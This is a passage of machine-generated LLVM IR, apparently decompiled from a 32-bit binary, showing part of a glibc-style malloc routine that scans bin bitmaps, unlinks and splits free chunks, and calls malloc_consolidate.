dec_label_pc_8052b3d:                             ; preds = %dec_label_pc_8052b36, %dec_label_pc_8052b3d
  %v0_8052b51106 = phi i32 [ %v3_8052b41, %dec_label_pc_8052b3d ], [ %v3_8052b1b, %dec_label_pc_8052b36 ]
  store i32 %v0_8052b51106, i32* %ecx.global-to-local, align 4
  %v1_8052b41 = add i32 %v0_8052b51106, 8
  %v2_8052b41 = inttoptr i32 %v1_8052b41 to i32*
  %v3_8052b41 = load i32, i32* %v2_8052b41, align 4
  store i32 %v3_8052b41, i32* %ecx.global-to-local, align 4
  store i32 %v3_8052b41, i32* %ebx.global-to-local, align 4
  %v2_8052b4c = add i32 %v3_8052b41, 4
  %v3_8052b4c = inttoptr i32 %v2_8052b4c to i32*
  %v4_8052b4c = load i32, i32* %v3_8052b4c, align 4
  %v10_8052b4c = icmp ult i32 %v1_8052b38, %v4_8052b4c
  br i1 %v10_8052b4c, label %dec_label_pc_8052b3d, label %dec_label_pc_8052b51

dec_label_pc_8052b51:                             ; preds = %dec_label_pc_8052b3d, %dec_label_pc_8052b36
  %v0_8052b51.lcssa = phi i32 [ %v3_8052b1b, %dec_label_pc_8052b36 ], [ %v3_8052b41, %dec_label_pc_8052b3d ]
  %v1_8052b51 = add i32 %v0_8052b51.lcssa, 12
  %v2_8052b51 = inttoptr i32 %v1_8052b51 to i32*
  %v3_8052b51 = load i32, i32* %v2_8052b51, align 4
  store i32 %v3_8052b51, i32* @ebx, align 4
  br label %dec_label_pc_8052b54

dec_label_pc_8052b54:                             ; preds = %dec_label_pc_8052afa, %dec_label_pc_8052b28, %dec_label_pc_8052b0b, %dec_label_pc_8052b51
  %v0_8052b54 = phi i32 [ %v0_8052b0d, %dec_label_pc_8052b0b ], [ %v0_8052b0d, %dec_label_pc_8052b51 ], [ %v0_8052b0d, %dec_label_pc_8052b28 ], [ %v2_8052afc, %dec_label_pc_8052afa ]
  %stack_var_-64.1 = phi i32 [ %v3_8052b1b, %dec_label_pc_8052b0b ], [ %v0_8052b51.lcssa, %dec_label_pc_8052b51 ], [ %v2_8052b14, %dec_label_pc_8052b28 ], [ %v3_8052b06, %dec_label_pc_8052afa ]
  %v1_8052b56 = urem i32 %v0_8052b54, 32
  %v2_8052b56 = icmp eq i32 %v1_8052b56, 0
  store i32 %v1_8052b56, i32* %esi.global-to-local, align 4
  store i32 %v1_8052b56, i32* @ecx, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_8052b60 = sdiv i32 %v0_8052b54, 32
  store i32 %v2_8052b60, i32* %edx.global-to-local, align 4
  br i1 %v2_8052b56, label %bb82, label %bb

bb:                                               ; preds = %dec_label_pc_8052b54
  %v5_8052b63 = shl i32 1, %v1_8052b56
  store i32 %v5_8052b63, i32* %eax.global-to-local, align 4
  br label %bb82

bb82:                                             ; preds = %dec_label_pc_8052b54, %bb
  %v5_8052b65 = phi i32 [ 1, %dec_label_pc_8052b54 ], [ %v5_8052b63, %bb ]
  %v1_8052b65 = mul nsw i32 %v2_8052b60, 4
  %v2_8052b65 = add i32 %v1_8052b65, ptrtoint (i32* @global_var_8067d54.239 to i32)
  %v3_8052b65 = inttoptr i32 %v2_8052b65 to i32*
  %v4_8052b65 = load i32, i32* %v3_8052b65, align 4
  %v6_8052b65 = or i32 %v4_8052b65, %v5_8052b65
  store i32 %v6_8052b65, i32* %v3_8052b65, align 4
  %v0_8052b6c = load i32, i32* @ebx, align 4
  %v1_8052b6c = load i32, i32* @ebp, align 4
  %v2_8052b6c = add i32 %v1_8052b6c, 12
  %v3_8052b6c = inttoptr i32 %v2_8052b6c to i32*
  store i32 %v0_8052b6c, i32* %v3_8052b6c, align 4
  store i32 %stack_var_-64.1, i32* @esi, align 4
  %v1_8052b73 = load i32, i32* @ebp, align 4
  %v2_8052b73 = add i32 %v1_8052b73, 8
  %v3_8052b73 = inttoptr i32 %v2_8052b73 to i32*
  store i32 %stack_var_-64.1, i32* %v3_8052b73, align 4
  %v0_8052b76 = load i32, i32* @ebp, align 4
  %v1_8052b76 = load i32, i32* @esi, align 4
  %v2_8052b76 = add i32 %v1_8052b76, 12
  %v3_8052b76 = inttoptr i32 %v2_8052b76 to i32*
  store i32 %v0_8052b76, i32* %v3_8052b76, align 4
  %v0_8052b79 = load i32, i32* @ebp, align 4
  %v1_8052b79 = load i32, i32* @ebx, align 4
  %v2_8052b79 = add i32 %v1_8052b79, 8
  %v3_8052b79 = inttoptr i32 %v2_8052b79 to i32*
  store i32 %v0_8052b79, i32* %v3_8052b79, align 4
  %v0_8052b7c = load i32, i32* @global_var_8067a60.238, align 32
  store i32 %v0_8052b7c, i32* @ebp, align 4
  %v9_8052b82 = icmp eq i32 %v0_8052b7c, 134642260
  %v1_8052b88 = icmp eq i1 %v9_8052b82, false
  br i1 %v1_8052b88, label %dec_label_pc_8052aab, label %dec_label_pc_8052b8e

dec_label_pc_8052b8e:                             ; preds = %bb82, %dec_label_pc_8052b7c.preheader
  br i1 %v8_8052a3f, label %dec_label_pc_8052c1c, label %dec_label_pc_8052b9c

dec_label_pc_8052b9c:                             ; preds = %dec_label_pc_8052b8e
  store i32 %stack_var_-40.0.ph, i32* %eax.global-to-local, align 4
  %v1_8052ba0 = mul i32 %stack_var_-40.0.ph, 8
  %v2_8052ba0 = add i32 %v1_8052ba0, ptrtoint (i32* @global_var_8067a4c.235 to i32)
  store i32 %v2_8052ba0, i32* %edx.global-to-local, align 4
  %v1_8052ba7 = add i32 %v1_8052ba0, add (i32 ptrtoint (i32* @global_var_8067a4c.235 to i32), i32 12)
  %v2_8052ba7 = inttoptr i32 %v1_8052ba7 to i32*
  %storemerge1.pre = load i32, i32* %v2_8052ba7, align 4
  br label %dec_label_pc_8052c18

dec_label_pc_8052bac:                             ; preds = %dec_label_pc_8052c18
  %v1_8052bac = add i32 %v4_8052bc3, 4
  %v2_8052bac = inttoptr i32 %v1_8052bac to i32*
  %v3_8052bac = load i32, i32* %v2_8052bac, align 4
  store i32 %v3_8052bac, i32* %ebx.global-to-local, align 4
  %v1_8052baf = add i32 %v4_8052bc3, 12
  %v2_8052baf = inttoptr i32 %v1_8052baf to i32*
  %v3_8052baf = load i32, i32* %v2_8052baf, align 4
  store i32 %v3_8052baf, i32* @ecx, align 4
  %v1_8052bb2 = and i32 %v3_8052bac, -4
  store i32 %v1_8052bb2, i32* @ebx, align 4
  %v10_8052bb5 = icmp ult i32 %v1_8052bb2, %v1_8052d96
  br i1 %v10_8052bb5, label %dec_label_pc_8052c18, label %dec_label_pc_8052bbb

dec_label_pc_8052bbb:                             ; preds = %dec_label_pc_8052bac
  %v1_8052bbb = add i32 %v4_8052bc3, 8
  %v2_8052bbb = inttoptr i32 %v1_8052bbb to i32*
  %v3_8052bbb = load i32, i32* %v2_8052bbb, align 4
  store i32 %v3_8052bbb, i32* @edx, align 4
  %v1_8052bbe = add i32 %v3_8052bbb, 12
  %v2_8052bbe = inttoptr i32 %v1_8052bbe to i32*
  %v3_8052bbe = load i32, i32* %v2_8052bbe, align 4
  %v15_8052bbe = icmp eq i32 %v3_8052bbe, %v4_8052bc3
  %v1_8052bc1 = icmp eq i1 %v15_8052bbe, false
  br i1 %v1_8052bc1, label %dec_label_pc_8052bc8, label %dec_label_pc_8052bc3

dec_label_pc_8052bc3:                             ; preds = %dec_label_pc_8052bbb
  %v1_8052bc3 = add i32 %v3_8052baf, 8
  %v2_8052bc3 = inttoptr i32 %v1_8052bc3 to i32*
  %v3_8052bc3 = load i32, i32* %v2_8052bc3, align 4
  %v15_8052bc3 = icmp eq i32 %v3_8052bc3, %v4_8052bc3
  br i1 %v15_8052bc3, label %dec_label_pc_8052bcd, label %dec_label_pc_8052bc8

dec_label_pc_8052bc8:                             ; preds = %dec_label_pc_8052bc3, %dec_label_pc_8052bbb
  %v0_8052bc8 = call i32 @abort()
  store i32 %v0_8052bc8, i32* %eax.global-to-local, align 4
  %v0_8052bcd.pre = load i32, i32* @ebx, align 4
  %v0_8052bd3.pre = load i32, i32* @ecx, align 4
  %v1_8052bd3.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8052bcd

dec_label_pc_8052bcd:                             ; preds = %dec_label_pc_8052bc3, %dec_label_pc_8052bc8
  %v1_8052bd3 = phi i32 [ %v3_8052bbb, %dec_label_pc_8052bc3 ], [ %v1_8052bd3.pre, %dec_label_pc_8052bc8 ]
  %v0_8052bd3 = phi i32 [ %v3_8052baf, %dec_label_pc_8052bc3 ], [ %v0_8052bd3.pre, %dec_label_pc_8052bc8 ]
  %v0_8052bcd = phi i32 [ %v1_8052bb2, %dec_label_pc_8052bc3 ], [ %v0_8052bcd.pre, %dec_label_pc_8052bc8 ]
  %v5_8052bcf = sub i32 %v0_8052bcd, %v1_8052d96
  store i32 %v5_8052bcf, i32* %esi.global-to-local, align 4
  %v2_8052bd3 = add i32 %v1_8052bd3, 12
  %v3_8052bd3 = inttoptr i32 %v2_8052bd3 to i32*
  store i32 %v0_8052bd3, i32* %v3_8052bd3, align 4
  %v0_8052bd6 = load i32, i32* @edx, align 4
  %v1_8052bd6 = load i32, i32* @ecx, align 4
  %v2_8052bd6 = add i32 %v1_8052bd6, 8
  %v3_8052bd6 = inttoptr i32 %v2_8052bd6 to i32*
  store i32 %v0_8052bd6, i32* %v3_8052bd6, align 4
  %v0_8052bd9 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052bd9 = add i32 %v0_8052bd9, 8
  store i32 %v1_8052bd9, i32* @ecx, align 4
  %v0_8052bdc = load i32, i32* %esi.global-to-local, align 4
  %tmp137 = icmp ult i32 %v0_8052bdc, 16
  br i1 %tmp137, label %dec_label_pc_805310b, label %dec_label_pc_8052be5

dec_label_pc_8052be5:                             ; preds = %dec_label_pc_8052bcd
  %v2_8052be9 = add i32 %v0_8052bd9, %v1_8052d96
  store i32 %v2_8052be9, i32* %edx.global-to-local, align 4
  %v1_8052bec = or i32 %v1_8052d96, 1
  store i32 %v1_8052bec, i32* %ebx.global-to-local, align 4
  %v2_8052bef = add i32 %v0_8052bd9, 4
  %v3_8052bef = inttoptr i32 %v2_8052bef to i32*
  store i32 %v1_8052bec, i32* %v3_8052bef, align 4
  %v0_8052bf2 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052bf4 = or i32 %v0_8052bf2, 1
  store i32 %v1_8052bf4, i32* %eax.global-to-local, align 4
  %v0_8052bf7 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052bf7 = load i32, i32* @ebp, align 4
  %v2_8052bf7 = add i32 %v1_8052bf7, 8
  %v3_8052bf7 = inttoptr i32 %v2_8052bf7 to i32*
  store i32 %v0_8052bf7, i32* %v3_8052bf7, align 4
  %v0_8052bfa = load i32, i32* %edx.global-to-local, align 4
  %v1_8052bfa = load i32, i32* @ebp, align 4
  %v2_8052bfa = add i32 %v1_8052bfa, 12
  %v3_8052bfa = inttoptr i32 %v2_8052bfa to i32*
  store i32 %v0_8052bfa, i32* %v3_8052bfa, align 4
  %v0_8052bfd = load i32, i32* %edx.global-to-local, align 4
  %v1_8052bfd = add i32 %v0_8052bfd, 8
  %v2_8052bfd = inttoptr i32 %v1_8052bfd to i32*
  store i32 ptrtoint (i32* @global_var_8067a54.237 to i32), i32* %v2_8052bfd, align 4
  %v0_8052c04 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052c04 = add i32 %v0_8052c04, 12
  %v2_8052c04 = inttoptr i32 %v1_8052c04 to i32*
  store i32 ptrtoint (i32* @global_var_8067a54.237 to i32), i32* %v2_8052c04, align 4
  %v0_8052c0b = load i32, i32* %eax.global-to-local, align 4
  %v1_8052c0b = load i32, i32* %edx.global-to-local, align 4
  %v2_8052c0b = add i32 %v1_8052c0b, 4
  %v3_8052c0b = inttoptr i32 %v2_8052c0b to i32*
  store i32 %v0_8052c0b, i32* %v3_8052c0b, align 4
  %v0_8052c0e = load i32, i32* %esi.global-to-local, align 4
  %v1_8052c0e = load i32, i32* %edx.global-to-local, align 4
  %v3_8052c0e = add i32 %v1_8052c0e, %v0_8052c0e
  %v4_8052c0e = inttoptr i32 %v3_8052c0e to i32*
  store i32 %v0_8052c0e, i32* %v4_8052c0e, align 4
  br label %dec_label_pc_8053110

dec_label_pc_8052c18:                             ; preds = %dec_label_pc_8052bac, %dec_label_pc_8052b9c
  %v4_8052bc3 = phi i32 [ %storemerge1.pre, %dec_label_pc_8052b9c ], [ %v3_8052baf, %dec_label_pc_8052bac ]
  store i32 %v4_8052bc3, i32* %eax.global-to-local, align 4
  %v12_8052c18 = icmp eq i32 %v4_8052bc3, %v2_8052ba0
  %v1_8052c1a = icmp eq i1 %v12_8052c18, false
  br i1 %v1_8052c1a, label %dec_label_pc_8052bac, label %dec_label_pc_8052c1c.loopexit

dec_label_pc_8052c1c.loopexit:                    ; preds = %dec_label_pc_8052c18
  br label %dec_label_pc_8052c1c

dec_label_pc_8052c1c:                             ; preds = %dec_label_pc_8052c1c.loopexit, %dec_label_pc_8052b8e
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_8052c25 = add i32 %stack_var_-40.0.ph, 1
  store i32 %v1_8052c25, i32* %ecx.global-to-local, align 4
  %v2_8052c28 = udiv i32 %v1_8052c25, 32
  store i32 %v2_8052c28, i32* @edi, align 4
  %v1_8052c2b = mul nuw nsw i32 %v2_8052c28, 4
  %v2_8052c2b = add i32 %v1_8052c2b, ptrtoint (i32* @global_var_8067d54.239 to i32)
  %v3_8052c2b = inttoptr i32 %v2_8052c2b to i32*
  %v4_8052c2b = load i32, i32* %v3_8052c2b, align 4
  store i32 %v4_8052c2b, i32* %edx.global-to-local, align 4
  %v1_8052c32 = mul i32 %v1_8052c25, 8
  %v2_8052c32 = add i32 %v1_8052c32, ptrtoint (i32* @global_var_8067a4c.235 to i32)
  store i32 %v2_8052c32, i32* %ebx.global-to-local, align 4
  %v1_8052c39 = urem i32 %v1_8052c25, 32
  %v2_8052c39 = icmp eq i32 %v1_8052c39, 0
  store i32 %v1_8052c39, i32* %ecx.global-to-local, align 4
  br i1 %v2_8052c39, label %.preheader, label %bb83

bb83:                                             ; preds = %dec_label_pc_8052c1c
  %v5_8052c3c = shl i32 1, %v1_8052c39
  store i32 %v5_8052c3c, i32* %esi.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_8052c1c, %bb83, %dec_label_pc_8052c7d
  %v1_8052c3e = phi i32 [ %v1_8052c3e.pre, %dec_label_pc_8052c7d ], [ %v4_8052c2b, %bb83 ], [ %v4_8052c2b, %dec_label_pc_8052c1c ]
  %v0_8052c42 = phi i32 [ %v0_8052c3e.pre, %dec_label_pc_8052c7d ], [ %v5_8052c3c, %bb83 ], [ 1, %dec_label_pc_8052c1c ]
  %tmp84 = icmp ule i32 %v0_8052c42, %v1_8052c3e
  %v1_8052c42 = icmp eq i32 %v0_8052c42, 0
  %v1_8052c44 = icmp eq i1 %v1_8052c42, false
  %or.cond = and i1 %tmp84, %v1_8052c44
  br i1 %or.cond, label %dec_label_pc_8052c42.dec_label_pc_8052c72.preheader_crit_edge, label %dec_label_pc_8052c46.preheader

dec_label_pc_8052c42.dec_label_pc_8052c72.preheader_crit_edge: ; preds = %.preheader
  %v0_8052c6d12.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052c72.preheader

dec_label_pc_8052c46.preheader:                   ; preds = %.preheader
  %v0_8052c46.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8052c46

dec_label_pc_8052c46:                             ; preds = %dec_label_pc_8052c46.preheader, %dec_label_pc_8052c50
  %v0_8052c46 = phi i32 [ %v0_8052c46.pre, %dec_label_pc_8052c46.preheader ], [ %v1_8052c46, %dec_label_pc_8052c50 ]
  %v1_8052c46 = add i32 %v0_8052c46, 1
  store i32 %v1_8052c46, i32* @edi, align 4
  %v6_8052c4a = icmp ugt i32 %v1_8052c46, 2
  br i1 %v6_8052c4a, label %dec_label_pc_8052d01.loopexit, label %dec_label_pc_8052c50

dec_label_pc_8052c50:                             ; preds = %dec_label_pc_8052c46
  %v1_8052c50 = mul i32 %v1_8052c46, 4
  %v2_8052c50 = add i32 %v1_8052c50, ptrtoint (i32* @global_var_8067d54.239 to i32)
  %v3_8052c50 = inttoptr i32 %v2_8052c50 to i32*
  %v4_8052c50 = load i32, i32* %v3_8052c50, align 4
  store i32 %v4_8052c50, i32* %edx.global-to-local, align 4
  %v1_8052c57 = icmp eq i32 %v4_8052c50, 0
  br i1 %v1_8052c57, label %dec_label_pc_8052c46, label %dec_label_pc_8052c5b

dec_label_pc_8052c5b:                             ; preds = %dec_label_pc_8052c50
  store i32 1, i32* %esi.global-to-local, align 4
  %v2_8052c62 = mul i32 %v1_8052c46, 256
  store i32 %v2_8052c62, i32* %eax.global-to-local, align 4
  %v1_8052c65 = add i32 %v2_8052c62, ptrtoint (i32* @global_var_8067a4c.235 to i32)
  store i32 %v1_8052c65, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052c72.preheader

dec_label_pc_8052c72.preheader:                   ; preds = %dec_label_pc_8052c42.dec_label_pc_8052c72.preheader_crit_edge, %dec_label_pc_8052c5b
  %v0_8052c6d12 = phi i32 [ %v1_8052c65, %dec_label_pc_8052c5b ], [ %v0_8052c6d12.pre, %dec_label_pc_8052c42.dec_label_pc_8052c72.preheader_crit_edge ]
  %esi.promoted = phi i32 [ 1, %dec_label_pc_8052c5b ], [ %v0_8052c42, %dec_label_pc_8052c42.dec_label_pc_8052c72.preheader_crit_edge ]
  %v0_8052c83 = phi i32 [ %v4_8052c50, %dec_label_pc_8052c5b ], [ %v1_8052c3e, %dec_label_pc_8052c42.dec_label_pc_8052c72.preheader_crit_edge ]
  %v2_8052c724 = and i32 %v0_8052c83, %esi.promoted
  %v3_8052c725 = icmp eq i32 %v2_8052c724, 0
  br i1 %v3_8052c725, label %dec_label_pc_8052c6d, label %dec_label_pc_8052c76

dec_label_pc_8052c6d:                             ; preds = %dec_label_pc_8052c72.preheader, %dec_label_pc_8052c6d
  %v2_8052c7014 = phi i32 [ %v2_8052c70, %dec_label_pc_8052c6d ], [ %esi.promoted, %dec_label_pc_8052c72.preheader ]
  %v0_8052c6d13 = phi i32 [ %v1_8052c6d, %dec_label_pc_8052c6d ], [ %v0_8052c6d12, %dec_label_pc_8052c72.preheader ]
  %v1_8052c6d = add i32 %v0_8052c6d13, 8
  %v2_8052c70 = mul i32 %v2_8052c7014, 2
  %v2_8052c72 = and i32 %v2_8052c70, %v0_8052c83
  %v3_8052c72 = icmp eq i32 %v2_8052c72, 0
  br i1 %v3_8052c72, label %dec_label_pc_8052c6d, label %dec_label_pc_8052c72.dec_label_pc_8052c76_crit_edge

dec_label_pc_8052c72.dec_label_pc_8052c76_crit_edge: ; preds = %dec_label_pc_8052c6d
  store i32 %v1_8052c6d, i32* %ebx.global-to-local, align 4
  store i32 %v2_8052c70, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8052c76

dec_label_pc_8052c76:                             ; preds = %dec_label_pc_8052c72.dec_label_pc_8052c76_crit_edge, %dec_label_pc_8052c72.preheader
  %v0_8052c7d = phi i32 [ %v2_8052c70, %dec_label_pc_8052c72.dec_label_pc_8052c76_crit_edge ], [ %esi.promoted, %dec_label_pc_8052c72.preheader ]
  %v1_8052ca0 = phi i32 [ %v1_8052c6d, %dec_label_pc_8052c72.dec_label_pc_8052c76_crit_edge ], [ %v0_8052c6d12, %dec_label_pc_8052c72.preheader ]
  %v1_8052c76 = add i32 %v1_8052ca0, 12
  %v2_8052c76 = inttoptr i32 %v1_8052c76 to i32*
  %v3_8052c76 = load i32, i32* %v2_8052c76, align 4
  store i32 %v3_8052c76, i32* @ecx, align 4
  %v12_8052c79 = icmp eq i32 %v3_8052c76, %v1_8052ca0
  %v1_8052c7b = icmp eq i1 %v12_8052c79, false
  br i1 %v1_8052c7b, label %dec_label_pc_8052c91, label %dec_label_pc_8052c7d

dec_label_pc_8052c7d:                             ; preds = %dec_label_pc_8052c76
  %v2_8052c7f = mul i32 %v0_8052c7d, 2
  store i32 %v2_8052c7f, i32* %esi.global-to-local, align 4
  %v1_8052c81 = sub i32 -1, %v0_8052c7d
  store i32 %v1_8052c81, i32* %eax.global-to-local, align 4
  %v2_8052c83 = and i32 %v0_8052c83, %v1_8052c81
  store i32 %v2_8052c83, i32* %edx.global-to-local, align 4
  %v1_8052c85 = add i32 %v3_8052c76, 8
  store i32 %v1_8052c85, i32* %ebx.global-to-local, align 4
  %v1_8052c88 = load i32, i32* @edi, align 4
  %v2_8052c88 = mul i32 %v1_8052c88, 4
  %v3_8052c88 = add i32 %v2_8052c88, ptrtoint (i32* @global_var_8067d54.239 to i32)
  %v4_8052c88 = inttoptr i32 %v3_8052c88 to i32*
  store i32 %v2_8052c83, i32* %v4_8052c88, align 4
  %v0_8052c3e.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_8052c3e.pre = load i32, i32* %edx.global-to-local, align 4
  br label %.preheader

dec_label_pc_8052c91:                             ; preds = %dec_label_pc_8052c76
  %v1_8052c91 = add i32 %v3_8052c76, 4
  %v2_8052c91 = inttoptr i32 %v1_8052c91 to i32*
  %v3_8052c91 = load i32, i32* %v2_8052c91, align 4
  store i32 %v3_8052c91, i32* %edx.global-to-local, align 4
  %v1_8052c94 = add i32 %v3_8052c76, 12
  %v2_8052c94 = inttoptr i32 %v1_8052c94 to i32*
  %v3_8052c94 = load i32, i32* %v2_8052c94, align 4
  store i32 %v3_8052c94, i32* %eax.global-to-local, align 4
  %v1_8052c97 = and i32 %v3_8052c91, -4
  store i32 %v1_8052c97, i32* %edx.global-to-local, align 4
  %v5_8052c9c = sub i32 %v1_8052c97, %v1_8052d96
  store i32 %v5_8052c9c, i32* %esi.global-to-local, align 4
  store i32 %v3_8052c94, i32* %v2_8052c76, align 4
  %v0_8052ca3 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052ca3 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052ca3 = add i32 %v1_8052ca3, 8
  %v3_8052ca3 = inttoptr i32 %v2_8052ca3 to i32*
  store i32 %v0_8052ca3, i32* %v3_8052ca3, align 4
  %v0_8052ca6 = load i32, i32* %esi.global-to-local, align 4
  %tmp138 = icmp ult i32 %v0_8052ca6, 16
  %v0_8052cab = load i32, i32* @ecx, align 4
  br i1 %tmp138, label %dec_label_pc_8052cab, label %dec_label_pc_8052cb2

dec_label_pc_8052cab:                             ; preds = %dec_label_pc_8052c91
  %v1_8052cab = load i32, i32* %edx.global-to-local, align 4
  %v2_8052cab = add i32 %v0_8052cab, 4
  %v3_8052cab = add i32 %v2_8052cab, %v1_8052cab
  %v4_8052cab = inttoptr i32 %v3_8052cab to i32*
  %v5_8052cab = load i32, i32* %v4_8052cab, align 4
  %v6_8052cab = or i32 %v5_8052cab, 1
  store i32 %v6_8052cab, i32* %v4_8052cab, align 4
  br label %dec_label_pc_8052cf9

dec_label_pc_8052cb2:                             ; preds = %dec_label_pc_8052c91
  %v2_8052cb6 = add i32 %v0_8052cab, %v1_8052d96
  store i32 %v2_8052cb6, i32* %eax.global-to-local, align 4
  %v1_8052cbf = load i32, i32* @ebp, align 4
  %v2_8052cbf = add i32 %v1_8052cbf, 8
  %v3_8052cbf = inttoptr i32 %v2_8052cbf to i32*
  store i32 %v2_8052cb6, i32* %v3_8052cbf, align 4
  %v0_8052cc2 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052cc2 = load i32, i32* @ebp, align 4
  %v2_8052cc2 = add i32 %v1_8052cc2, 12
  %v3_8052cc2 = inttoptr i32 %v2_8052cc2 to i32*
  store i32 %v0_8052cc2, i32* %v3_8052cc2, align 4
  %v0_8052cc5 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052cc5 = add i32 %v0_8052cc5, 8
  %v2_8052cc5 = inttoptr i32 %v1_8052cc5 to i32*
  store i32 ptrtoint (i32* @global_var_8067a54.237 to i32), i32* %v2_8052cc5, align 4
  %v0_8052ccc = load i32, i32* %eax.global-to-local, align 4
  %v1_8052ccc = add i32 %v0_8052ccc, 12
  %v2_8052ccc = inttoptr i32 %v1_8052ccc to i32*
  store i32 ptrtoint (i32* @global_var_8067a54.237 to i32), i32* %v2_8052ccc, align 4
  %v0_8052cd3 = load i32, i32* @global_var_8067a50.236, align 16
  %v4_8052cd9 = load i32, i32* %eax.global-to-local, align 4
  %v5_8052cd9 = select i1 %v8_8052a3f, i32 %v4_8052cd9, i32 %v0_8052cd3
  %v4_8052cdc = or i32 %v1_8052d96, 1
  store i32 %v5_8052cd9, i32* @global_var_8067a50.236, align 16
  %v0_8052ce7 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v4_8052cdc, i32* %ebx.global-to-local, align 4
  %v1_8052ced = or i32 %v0_8052ce7, 1
  store i32 %v1_8052ced, i32* %edx.global-to-local, align 4
  %v3_8052cf0 = add i32 %v0_8052ce7, %v4_8052cd9
  %v4_8052cf0 = inttoptr i32 %v3_8052cf0 to i32*
  store i32 %v0_8052ce7, i32* %v4_8052cf0, align 4
  %v0_8052cf3 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052cf3 = load i32, i32* @ecx, align 4
  %v2_8052cf3 = add i32 %v1_8052cf3, 4
  %v3_8052cf3 = inttoptr i32 %v2_8052cf3 to i32*
  store i32 %v0_8052cf3, i32* %v3_8052cf3, align 4
  %v0_8052cf6 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052cf6 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052cf6 = add i32 %v1_8052cf6, 4
  %v3_8052cf6 = inttoptr i32 %v2_8052cf6 to i32*
  store i32 %v0_8052cf6, i32* %v3_8052cf6, align 4
  br label %dec_label_pc_8052cf9

dec_label_pc_8052cf9:                             ; preds = %dec_label_pc_8052ded, %dec_label_pc_8052cab, %dec_label_pc_8052cb2
  %v0_8052cf9 = load i32, i32* @ecx, align 4
  %v1_8052cf9 = add i32 %v0_8052cf9, 8
  store i32 %v1_8052cf9, i32* @ebx, align 4
  br label %dec_label_pc_8053121

dec_label_pc_8052d01.loopexit:                    ; preds = %dec_label_pc_8052c46
  br label %dec_label_pc_8052d01

dec_label_pc_8052d01:                             ; preds = %dec_label_pc_8052d01.loopexit, %dec_label_pc_8052a01, %dec_label_pc_8052a09
  %v0_8052d01 = load i32, i32* @global_var_8067a4c.235, align 4
  store i32 %v0_8052d01, i32* @ebx, align 4
  store i32 %v1_8052d96, i32* %esi.global-to-local, align 4
  %v1_8052d0b = add i32 %v0_8052d01, 4
  %v2_8052d0b = inttoptr i32 %v1_8052d0b to i32*
  %v3_8052d0b = load i32, i32* %v2_8052d0b, align 4
  %v1_8052d0e = add i32 %v1_8052d96, 16
  store i32 %v1_8052d0e, i32* @esi, align 4
  %v1_8052d15 = and i32 %v3_8052d0b, -4
  store i32 %v1_8052d15, i32* %ecx.global-to-local, align 4
  %v7_8052d18 = icmp ult i32 %v1_8052d15, %v1_8052d0e
  br i1 %v7_8052d18, label %dec_label_pc_8052d38, label %dec_label_pc_8052d1c

dec_label_pc_8052d1c:                             ; preds = %dec_label_pc_8052d01
  %v2_8052d20 = add i32 %v0_8052d01, %v1_8052d96
  store i32 %v2_8052d20, i32* %edx.global-to-local, align 4
  %v1_8052d23 = or i32 %v1_8052d96, 1
  store i32 %v1_8052d23, i32* %eax.global-to-local, align 4
  store i32 %v2_8052d20, i32* @global_var_8067a4c.235, align 4
  store i32 %v1_8052d23, i32* %v2_8052d0b, align 4
  %v0_8052d2f = load i32, i32* %ecx.global-to-local, align 4
  %v5_8052d2f = sub i32 %v0_8052d2f, %v1_8052d96
  store i32 %v5_8052d2f, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80530b1

dec_label_pc_8052d38:                             ; preds = %dec_label_pc_8052d01
  %v0_8052d38 = load i8, i8* @global_var_8067a20.234, align 32
  %v1_8052d38 = and i8 %v0_8052d38, 2
  %v2_8052d38 = icmp eq i8 %v1_8052d38, 0
  %v0_8052d3f = load i32, i32* @global_var_8067d7c.240, align 4
  store i32 %v0_8052d3f, i32* %edx.global-to-local, align 4
  br i1 %v2_8052d38, label %dec_label_pc_8052d6c, label %dec_label_pc_8052d47

dec_label_pc_8052d47:                             ; preds = %dec_label_pc_8052d38
  store i32 ptrtoint (i8* @global_var_8067a20.234 to i32), i32* %stack_var_-92, align 4
  %v2_8052d4f = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8067a20.234 to i32*))
  store i32 ptrtoint (i8* @global_var_8067a20.234 to i32), i32* @ebx, align 4
  %v1_8052d59 = add i32 %v1_8052d96, -7
  store i32 %v1_8052d59, i32* %eax.global-to-local, align 4
  store i32 %v1_8052d59, i32* %stack_var_-92, align 4
  %v1_8052d5d = call i32 @malloc(i32 %v1_8052d59)
  store i32 %v1_8052d5d, i32* %eax.global-to-local, align 4
  store i32 %v1_8052d5d, i32* @ebx, align 4
  br label %dec_label_pc_8053121

dec_label_pc_8052d6c:                             ; preds = %dec_label_pc_8052d38
  store i32 %v1_8052d96, i32* @ebx, align 4
  %v1_8052d70 = add i32 %v0_8052d3f, -1
  store i32 %v1_8052d70, i32* @ecx, align 4
  %v1_8052d73 = load i32, i32* @global_var_8067d6c.241, align 4
  %v7_8052d73 = icmp ult i32 %v1_8052d96, %v1_8052d73
  br i1 %v7_8052d73, label %dec_label_pc_8052e4e, label %dec_label_pc_8052d83

dec_label_pc_8052d83:                             ; preds = %dec_label_pc_8052d6c
  %v0_8052d83 = load i32, i32* @global_var_8067d70.242, align 16
  store i32 %v0_8052d83, i32* %eax.global-to-local, align 4
  %v1_8052d88 = load i32, i32* @global_var_8067d74.243, align 4
  %v5_8052d8e = icmp slt i32 %v0_8052d83, %v1_8052d88
